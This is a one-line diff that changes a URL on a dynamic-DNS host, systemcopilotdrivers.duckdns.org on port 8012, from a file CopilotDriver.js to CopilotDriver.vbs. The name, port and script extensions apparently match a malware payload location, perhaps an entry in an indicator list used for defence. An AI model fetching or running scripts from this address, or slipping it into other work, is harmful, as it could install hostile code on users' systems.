@@ -1,1 +1,1 @@
-http://systemcopilotdrivers.duckdns.org:8012/NuevasCarpeta/CopilotDriver.js
+http://systemcopilotdrivers.duckdns.org:8012/NuevasCarpeta/CopilotDriver.vbs
